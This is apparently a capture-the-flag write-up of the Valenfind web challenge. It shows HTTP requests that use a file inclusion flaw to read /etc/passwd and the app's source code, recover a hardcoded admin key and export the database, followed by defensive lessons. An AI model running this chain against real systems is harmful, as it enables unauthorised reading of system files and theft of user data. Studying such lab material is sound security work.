# Valenfind

## Description

> There’s this new dating app called **Valenfind** that just popped up out of nowhere. I hear the creator only learned to code this year; surely this must be vibe-coded. Can you exploit it?

---

## Enumeration

We start by accessing the Valenfind web application and creating a profile.

Since the application contains multiple user profiles, the first thing that comes to mind is checking for an **IDOR (Insecure Direct Object Reference)** vulnerability.

We inspect profile-related requests and try manipulating identifiers to determine whether we can access other users' information.

Nothing immediately useful comes from this.

---

## SQL Injection

The application has a login page, so another obvious attack vector is SQL injection.

We try several basic SQL injection payloads against the login functionality.

However, the login page does not appear to be vulnerable to SQL injection.

So we move on to investigating the application's other functionality.

---

# Finding the LFI

After creating a profile and browsing through the dashboard, we start inspecting the requests generated by the application.

While loading each profile, we notice that the application makes a request to load a **layout/theme**.

This looks interesting because the layout appears to be controlled through a request parameter.

We capture the request using **Burp Suite** and modify the `layout` parameter.

Original request:

```http
GET /api/fetch_layout?layout=... HTTP/1.1
Host: 10.49.186.33:5000
```

We test whether the parameter allows us to access arbitrary files:

```http
GET /api/fetch_layout?layout=/etc HTTP/1.1
Host: 10.49.186.33:5000
```

The server responds with information from the requested filesystem location.

This confirms that the `layout` parameter is vulnerable to **Local File Inclusion (LFI)**.

---

# Reading `/etc/passwd`

A common first step when discovering LFI is attempting to read `/etc/passwd`.

We change the request to:

```http
GET /api/fetch_layout?layout=/etc/passwd HTTP/1.1
Host: 10.49.186.33:5000
```

The file is successfully read.

However, `/etc/passwd` does not contain anything particularly useful for obtaining the flag or credentials.

Therefore, we need to use the LFI to learn more about the application itself.

---

# Reading `/proc/self/cmdline`

Since this is a Python web application, the process information under `/proc` can be useful.

We try:

```http
GET /api/fetch_layout?layout=/proc/self/cmdline HTTP/1.1
Host: 10.49.186.33:5000
```

The response reveals information about how the application is being executed.

This gives us an important clue about the location of the application's source code.

The application is located at:

```text
/opt/Valenfind/app.py
```

---

# Source Code Disclosure

We can now use the LFI vulnerability to read the application's source code.

Request:

```http
GET /api/fetch_layout?layout=/opt/Valenfind/app.py HTTP/1.1
Host: 10.49.186.33:5000
```

The source code is returned by the application.

While going through the code, we find something much more interesting than the LFI itself.

An administrative API key is hardcoded in the source:

```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```

We also discover an administrative endpoint:

```text
/api/admin/export_db
```

At this point, we have everything required to access the database export.

---

# Exploiting the Admin API

The application expects an administrative token in the request header.

From the source code:

```text
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```

We therefore construct a request to the database export endpoint and provide the discovered key through the `X-Valentine-Token` header.

```http
GET /api/admin/export_db HTTP/1.1
Host: 10.49.186.33:5000
X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.49.186.33:5000/profile/casanova_official
Connection: keep-alive
Cookie: session=...
```

The server accepts the administrative token and provides access to the database export.

# Vulnerabilities

The challenge combines multiple security issues:

### 1. Local File Inclusion

The `layout` parameter allows arbitrary filesystem paths to be supplied:

```text
/api/fetch_layout?layout=<FILE>
```

There is insufficient validation of the requested file.

### 2. Source Code Disclosure

Because of the LFI, the application's source code can be retrieved:

```text
/opt/Valenfind/app.py
```

### 3. Hardcoded Secret

The source code contains a sensitive administrative API key:

```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```

Secrets should never be hardcoded into publicly accessible application source code.

### 4. Broken Administrative Access Control

The administrative database endpoint relies on a token that can ultimately be recovered through the LFI vulnerability.

This creates a chain where a file inclusion vulnerability leads directly to privileged API access.

---

# Key Takeaways

The interesting part of this challenge is that the initial vulnerabilities don't necessarily give you the final objective immediately.

The intended chain is:

**LFI → Source Code → Hardcoded API Key → Admin API → Database**

When testing web applications, don't stop after finding a vulnerability such as LFI. Think about what additional information that vulnerability can expose.

In particular, LFI can potentially expose:

* Configuration files
* Environment variables
* Source code
* Application secrets
* API keys
* Database credentials
* Process information
* Application logs

In this challenge, `/proc/self/cmdline` provides the clue needed to locate the source code, and the source code itself contains the credentials required to access the administrative endpoint.

---

## Conclusion

Valenfind is a good example of how seemingly small vulnerabilities can be chained together.

The application initially appears to have several possible attack surfaces, including IDOR and SQL injection. However, the key vulnerability is hidden in the profile layout functionality.

By identifying the LFI and using it methodically, we can progress from:

```text
Filesystem Access
        ↓
Application Discovery
        ↓
Source Code
        ↓
Credentials
        ↓
Administrative API
        ↓
Database
```

The challenge demonstrates why **input validation, secure secret management, and proper access control** are critical when developing web applications.
